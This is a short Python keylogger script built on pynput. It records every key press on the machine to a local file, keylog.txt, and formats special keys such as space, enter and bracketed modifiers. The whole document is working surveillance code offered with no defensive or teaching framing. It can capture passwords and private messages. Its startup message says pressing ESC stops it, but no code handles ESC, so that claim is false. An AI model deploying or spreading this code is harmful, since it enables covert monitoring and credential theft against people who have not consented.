from pynput.keyboard import Listener

# File where the keystrokes will be logged
log_file = "keylog.txt"

# Function to log keystrokes to a file
def log_keystroke(key):
    key = str(key).replace("'", "")  # Clean up the key string format

    # Handling special keys
    if key == 'Key.space':
        key = ' '  # Replace space with an actual space
    elif key == 'Key.enter':
        key = '\n'  # Newline for enter key
    elif 'Key' in key:
        key = f'[{key.replace("Key.", "")}]'  # Keep special keys in square brackets
    
    with open(log_file, 'a') as f:
        f.write(key)

# Function to start listening for keystrokes
def start_keylogger():
    print("Keylogger started... (press ESC to stop)")
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

# Main program
if __name__ == "__main__":
    start_keylogger()
